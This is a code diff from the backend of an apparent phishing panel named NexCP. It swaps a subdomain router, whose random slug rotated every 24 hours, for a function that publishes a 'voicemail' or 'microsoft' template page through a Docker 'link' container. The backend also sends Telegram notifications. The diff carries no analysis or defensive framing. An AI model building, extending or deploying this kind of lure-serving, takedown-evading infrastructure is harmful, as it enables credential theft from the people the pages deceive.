@@ -27,12 +27,22 @@ const lim = rateLimit({ windowMs: 15 * 60 * 1000, max: 600 });
 const alim = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });
 app.use('/api/', lim);
 
-// ── Link subdomain handler — must be before any routes ────────────────────────
-const LINK_BASE_DOMAIN = process.env.LINK_BASE_DOMAIN || '';
+// ── Link container management ─────────────────────────────────────────────────
 const HOST_PROJECT_DIR = process.env.HOST_PROJECT_DIR || '/opt/nexcp5';
 const DOCKER_NETWORK   = 'sumit_proxy';
 const LINK_CONTAINER   = 'nexcp-link';
 const linkDir = path.join(__dirname, '../frontend-link');
+
+/** Map template id to source HTML filename */
+const TEMPLATE_MAP = { voicemail: 'voicemail.html', microsoft: 'microsoft.html' };
+
+/** Copy the selected template as the active index.html served by the link container */
+function applyLinkTemplate(templateId) {
+  const src = TEMPLATE_MAP[templateId] || TEMPLATE_MAP.voicemail;
+  const srcPath = path.join(linkDir, src);
+  const destPath = path.join(linkDir, 'index.html');
+  if (fs.existsSync(srcPath)) fs.copyFileSync(srcPath, destPath);
+}
 
 /** Recreate the nexcp-link container with all enabled LINK domains */
 function recreateLinkContainer() {
@@ -59,71 +69,7 @@ function recreateLinkContainer() {
   execSync(cmd, { stdio: 'pipe', timeout: 30000 });
 }
 
-app.use((req, res, next) => {
-  if (!LINK_BASE_DOMAIN) return next();
-  const host = (req.hostname || '').toLowerCase();
-  if (!host.endsWith('.' + LINK_BASE_DOMAIN)) return next();
-  const sub = host.slice(0, -(LINK_BASE_DOMAIN.length + 1));
-  if (!sub || sub.includes('.')) return next();
-  // Skip known service subdomains
-  if (['api', 'panel', 'www', 'mail'].includes(sub)) return next();
-  const currentSlug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value;
-  if (!currentSlug || sub !== currentSlug) return res.status(404).send('Not found');
-  if (req.path.startsWith('/api/')) return next();
-  const ext = path.extname(req.path);
-  if (ext && ext !== '.html') {
-    const assetPath = path.join(linkDir, req.path);
-    if (fs.existsSync(assetPath)) return res.sendFile(assetPath);
-  }
-  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
-  const template = row?.value || 'voicemail';
-  const fileMap = { voicemail: 'index.html', microsoft: 'microsoft.html' };
-  const file = fileMap[template] || 'index.html';
-  return res.sendFile(path.join(linkDir, file));
-});
-
 app.get('/', (_req, res) => res.json({ status: 'ok', service: 'nexcp-api' }));
-
-// ── Random link slug generator ────────────────────────────────────────────────
-const SLUG_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789';
-function generateSlug() {
-  let s = '';
-  for (let i = 0; i < 10; i++) s += SLUG_CHARS[Math.floor(Math.random() * SLUG_CHARS.length)];
-  return s;
-}
-
-function ensureLinkSlug() {
-  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get();
-  if (!row || !row.value) {
-    const slug = generateSlug();
-    db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug', slug);
-    db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug_updated_at', new Date().toISOString());
-    console.log(`[Link] Generated initial slug: ${slug}`);
-    return slug;
-  }
-  return row.value;
-}
-
-function rotateLinkSlug() {
-  const slug = generateSlug();
-  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug', slug);
-  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run('link_slug_updated_at', new Date().toISOString());
-  console.log(`[Link] Rotated slug: ${slug}`);
-  return slug;
-}
-
-// Ensure slug exists on startup
-ensureLinkSlug();
-
-// Auto-rotate slug every 24h (check every 30 min)
-setInterval(() => {
-  const row = db.prepare("SELECT value FROM settings WHERE key = 'link_slug_updated_at'").get();
-  if (!row || !row.value) { rotateLinkSlug(); return; }
-  const age = Date.now() - new Date(row.value).getTime();
-  if (age > 24 * 60 * 60 * 1000) {
-    rotateLinkSlug();
-  }
-}, 30 * 60 * 1000);
 
 // ── Telegram notification ─────────────────────────────────────────────────────
 function sendTelegram(text) {
@@ -1435,6 +1381,8 @@ app.put('/api/settings', auth, (req, res) => {
   const { key, value } = req.body;
   if (!key || value === undefined) return res.status(400).json({ error: 'key and value required' });
   db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run(key, String(value));
+  // When link template changes, copy the selected HTML as index.html for the link container
+  if (key === 'link_template') applyLinkTemplate(String(value));
   res.json({ ok: true });
 });
 
@@ -1467,4 +1415,7 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log(`[NexCP] Running on port ${PORT}`);
   df.startAutoRefresh();
   df.startCleanup();
+  // Apply current link template on startup
+  const tmpl = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get()?.value || 'voicemail';
+  applyLinkTemplate(tmpl);
 });
